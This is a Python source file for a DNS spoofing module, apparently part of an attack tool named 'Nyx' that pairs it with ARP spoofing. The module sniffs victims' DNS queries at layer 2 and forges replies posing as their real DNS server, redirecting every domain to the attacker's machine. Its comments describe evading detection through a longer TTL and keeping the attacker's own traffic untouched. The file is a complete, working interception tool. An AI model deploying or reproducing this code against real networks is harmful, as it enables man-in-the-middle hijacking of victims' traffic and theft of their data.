import asyncio
import logging
import threading

logger = logging.getLogger(__name__)


class DNSSpoofer:
    """Intercepts DNS requests and replies with a spoofed IP address.

    The ``spoof_ip`` should be the IP address of the attacker/Nyx machine so
    that DNS clients resolve domain names to *us* (and we then forward/proxy
    the traffic). Using ``0.0.0.0`` here is a common mistake — it results in
    unreachable addresses and breaks the target's connectivity instead of
    intercepting it.

    Implementation note: with ARP spoofing the target keeps using its real
    DNS server, so the DNS query's destination IP is the *gateway*, not this
    host. A raw IP socket bound to port 53 only ever sees packets addressed
    to this machine locally — it never sees those in-transit queries, which
    is why a naive raw-socket spoofer silently does nothing. We therefore
    sniff at layer 2 (scapy/Npcap, already required by ARP spoofing) so the
    query is seen no matter which DNS server the target asked, then forge a
    reply that looks like it came from that exact server.
    """

    def __init__(self, spoof_ip: str, listen_ip: str = "0.0.0.0", dns_port: int = 53, target_ips: list[str] | None = None):
        """Initialise the DNS spoofer with the target spoof IP and interface.

        ``target_ips`` restricts spoofed answers to queries coming from those
        hosts only. When provided, queries from any other source (including
        the attacker's own machine) are left untouched — this keeps the local
        OS, Firefox, Nyx itself, etc. on the real DNS.

        The BPF filter in _sniff_loop is also narrowed: even if ``target_ips``
        is empty the sniffer excludes the local machine's own IP so that its
        DNS traffic (browsers, system resolver, OpenCode) is never intercepted.
        """
        self.spoof_ip = spoof_ip
        self.listen_ip = listen_ip
        self.dns_port = dns_port
        self.target_ips = set(target_ips or [])
        self._running = False
        self._task: asyncio.Task | None = None
        self._stop_evt = threading.Event()
        self._thread: threading.Thread | None = None

    async def start(self):
        """Start the DNS spoofing loop.

        Spawns a background layer-2 sniffer (via scapy). Does not fail if the
        raw socket can't be opened — the sniffer needs Npcap/WinPcap which is
        the same requirement ARP spoofing already has.
        """
        if self._running:
            return
        try:
            from scapy.all import conf
            conf.verb = 0
        except Exception as e:
            logger.warning("scapy not available for DNS spoofing: %s", e)
            raise
        self._stop_evt.clear()
        self._running = True
        self._thread = threading.Thread(
            target=self._sniff_loop, daemon=True, name="nyx-dns-spoofer"
        )
        self._thread.start()
        logger.info(
            "DNS spoofer started (layer-2 sniff) on %s:%d -> %s (TTL=300s)",
            self.listen_ip, self.dns_port, self.spoof_ip,
        )

    async def stop(self):
        """Stop the DNS spoofing loop."""
        self._running = False
        self._stop_evt.set()
        if self._thread:
            self._thread.join(timeout=5)
            self._thread = None
        # Back-compat with tests that set _task directly.
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except (asyncio.CancelledError, PermissionError, OSError):
                pass
            self._task = None
        logger.info("DNS spoofer stopped")

    _scapy_initialized = False

    @staticmethod
    def _init_scapy():
        if not DNSSpoofer._scapy_initialized:
            from scapy.config import conf
            conf.verb = 0
            DNSSpoofer._scapy_initialized = True

    def _build_spoof_response(self, packet: bytes, addr: tuple | None = None) -> bytes | None:
        """Construct a forged DNS response pointing the queried domain to the spoof IP.

        TTL is set to 300 seconds (5 min) instead of 60s to reduce the
        frequency of DNS queries from the target (lower detection surface).

        ``packet`` is the raw datagram as received: the original IP source is
        the DNS server the target asked (e.g. the gateway or 8.8.8.8), so the
        forged reply keeps that as its source — the target accepts it as a
        legitimate answer from its configured DNS server.
        """
        self._init_scapy()
        from scapy.all import IP, UDP, DNS, DNSRR
        try:
            pkt = IP(packet)
            if IP not in pkt or UDP not in pkt:
                return None
            dns = pkt[DNS]
            if not dns or dns.qr != 0:
                return None
            qname = dns.qd.qname.decode("utf-8", errors="replace").rstrip(".")
            if not qname:
                return None

            # TTL 300s: reduces detection vs 60s (fewer DNS requests visible)
            spoofed = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
                      UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
                      DNS(
                          id=dns.id,
                          qr=1,
                          aa=1,
                          qd=dns.qd,
                          an=DNSRR(rrname=dns.qd.qname, ttl=300, rdata=self.spoof_ip),
                      )
            return bytes(spoofed)
        except Exception as e:
            logger.debug("DNS spoof build error: %s", e)
        return None

    def _sniff_loop(self):
        """Layer-2 sniff thread. Sees DNS queries in transit (ARP-spoofed)."""
        try:
            from scapy.all import sniff
        except Exception as e:
            logger.error("DNS spoof sniffer unavailable: %s", e)
            self._running = False
            return

        # Build a precise BPF filter that:
        # 1. Only captures UDP port 53 (DNS)
        # 2. Excludes the local machine's own IP as source — this guarantees
        #    that Nyx itself, Firefox, OpenCode, and the system resolver on
        #    THIS machine are never touched by the sniffer, even if target_ips
        #    is empty. Without this, scapy's layer-2 sniffer sees ALL DNS
        #    traffic including the attacker's own, which can delay or block it.
        try:
            from modules.arp_spoof import _get_local_ip
            local_ip = _get_local_ip()
        except Exception:
            local_ip = None

        if local_ip and local_ip != "127.0.0.1":
            # Exclude the attacker's own IP as source so local DNS is untouched.
            bpf_filter = f"udp and dst port {self.dns_port} and not src host {local_ip}"
        else:
            bpf_filter = f"udp and dst port {self.dns_port}"

        # Also exclude this machine's loopback address from spoofing.
        if local_ip:
            self.target_ips.discard(local_ip)
        self.target_ips.discard("127.0.0.1")

        logger.debug("DNS sniffer BPF: '%s' (excluding local %s)", bpf_filter, local_ip)

        try:
            sniff(
                filter=bpf_filter,
                store=False,
                prn=lambda pkt: self._handle_packet(pkt),
                stop_filter=lambda _: self._stop_evt.is_set(),
            )
        except Exception as e:
            if self._running:
                logger.error("DNS spoof sniffer exited: %s", e)
                self._running = False

    def _handle_packet(self, pkt) -> None:
        if not self._running and not self._stop_evt.is_set():
            return
        try:
            from scapy.all import IP, UDP, send
            if IP in pkt and UDP in pkt and pkt[UDP].dport == self.dns_port:
                src_ip = pkt[IP].src
                # Only spoof queries from the selected targets (when the list
                # is non-empty). Everything else — including this machine's own
                # DNS — keeps its real resolution.
                if self.target_ips and src_ip not in self.target_ips:
                    return
                if src_ip == self.spoof_ip:
                    return
                raw = bytes(pkt)
                response = self._build_spoof_response(raw)
                if response:
                    # Forge the reply so it appears to come from the DNS server
                    # the target queried (its configured DNS IP). Layer-3 send
                    # routes it to the target on our subnet and fills in the
                    # target's MAC automatically.
                    send(IP(response), verbose=0)
                    logger.debug(
                        "Spoofed DNS for %s via %s -> %s",
                        src_ip, pkt[IP].dst, self.spoof_ip,
                    )
        except Exception as e:
            logger.debug("DNS spoof handle error: %s", e)